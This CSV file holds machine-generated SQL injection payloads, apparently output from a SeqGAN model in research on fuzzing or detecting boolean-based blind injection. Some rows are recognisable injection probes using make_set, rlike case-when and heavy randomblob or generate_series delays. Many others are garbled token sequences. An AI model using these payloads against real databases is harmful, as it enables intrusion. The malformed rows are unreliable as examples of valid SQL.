label,payload,family,payload_type,method,run_id,sample_index
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,87
attack,1  )   where 4062  )  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,88
attack,"1""a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,89
attack,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'dj)qables a' like 'ses_sipe.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,90
attack,1%'  )   and 3202  =  like  (  'ablesibsysinin.casers as t1  )      )  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,91
attack,"select t  )  )  ||chg  (  (  (  67  )  (  =  =  )  )    )   ageretqas caelde_uses as t  )  )    )   and   (  =    (  )  ,5556  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,92
attack,"-""  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,93
attack,"-4889""  )   where end thenallas as t3 andpkc_useschrerecesusysersereal    (  *  )  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,94
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,95
attack,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'esas gmeri=oumdeas t  )  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,96
attack,1'  )  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,97
attack,1'+  (  select '  )    )    )      )   and 8312  (  (    68  )  ||chr  (  (  =    (  ||chr  (  char  (  *  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,98
attack,",'   )    )    or 5903  =    (  ')    )    )qagze_mserseresecusexeseras  (  *  )   from rdba  (  =    (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,99
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,100
attack,1)   where 8060  =    (  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,101
attack,4906zdufuns ap,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,102
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,103
attack,"-%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """"  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,104
attack,"-2925%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,105
attack,"-6561az""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,106
attack,"1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%   ""  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,107
attack,"1%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%""  =  """"  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,108
attack,7182x'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,109
attack,"12583""  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,110
attack,"-9281  )     )    )  )   --   (  )  ,5000000   )    )",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,111
attack,or   )    (  )  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,112
attack,  =    (  5127  )  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,113
attack,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""se.  =    (  (  ,9432  )  )  --  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,114
attack,"1%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,115
attack,1 9643  )  )   and or mas where 2223  =  4062  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,116
attack,"-8673""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   """"  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""%,11inaint  (  69  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,117
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  ''  )   or 8384  =  like  (  '   ablesas as t1  )  )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,118
attack,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  '7185  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,119
attack,1  )   where 3902  103  )ahr,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,120
attack,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzqg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'""  =  ""kerserserese_ese=  (  90  )  ,5  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,121
attack,"-q%""  =  ""'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '  (  =  69bhssa geal  (  65  )  ,5  )  )   and 5903  =    (  *  )   a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,122
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""   )   and   (  )  (   5333  =    (  ""ymss""  ||chs_peseresb' like 'e_sest  (  (  (  (  (  (  *  )a""   )    )     =     (    (   ""j",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,123
attack,select count  ount2  )o,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,124
attack,"-4889""   )    )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,125
attack,-29125067s)a'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,126
